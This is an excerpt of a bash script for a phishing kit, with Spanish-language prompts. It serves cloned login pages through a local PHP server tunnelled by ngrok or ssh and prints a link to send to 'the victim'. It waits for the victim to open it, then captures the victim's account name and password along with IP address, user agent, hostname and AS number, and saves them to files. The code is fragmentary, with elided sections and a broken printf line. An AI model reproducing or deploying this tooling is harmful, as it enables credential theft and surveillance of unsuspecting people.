...
printf "\e [:]_°°Cuenta°°_[:] =\e[0m\e[1;77m %s\n\e[0m" $account
printf "\e [:]_°°Contraseña°°_[:] = \e[0m\e[1;77m %s\n\e[0m" $password
cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
printf "\e  [:]_°°Guardado°°_[:] = \e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
killall -2 php > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
killall ssh > /dev/null 2>&1
if [[ -e sendlink ]]; then
...
getcredentials() {
printf "\e[1;34m [ [ * ] ] Esperando los datos de la victima ...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/usernames.txt" ]]; then
printf "\n\e[1;93m [ [ * ] ]\e[1;93m]\e[0m\e[1;92m Datos encontrados!\n"
catch_cred
...
printf "[*]  IP de la Victima [_*_*]" $ip
printf "\e [:]_°°USER-AGENT°°_[:] = \e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e [:]_°°Guardado°°_[:] = \e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
...
if [[ $hostnameip != "" ]]; then
printf "[:]_°°Hostname°°_[:] = \e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##
...
if [[ $as_number != "" ]]; then
printf "\e[1;92m[-_-] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##
...
serverx() {
printf "
printf "[:]_°°_°°_[:] Iniciando servidor php...\n"
...
printf "\n"
printf '\e[1;30m [:]_°°<<>>°°_[:] Envie el link a la victima:\e[0m\e[1;77m %s \e[0m \n' $send_link
...
printf "[:]_°° :s °°_[:] Iniciando servidor php...\n"
cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf " [:]_°° =) °°_[:] Iniciando servidor ngrok...\n"
...
checkfound() {
			setterm -foreground cyan
printf "\n"
printf "\e[:]_°° :-¡ °°_[:] Esperando que la victima habra el enlace ...\e[0m\n"
while [ true ]; do
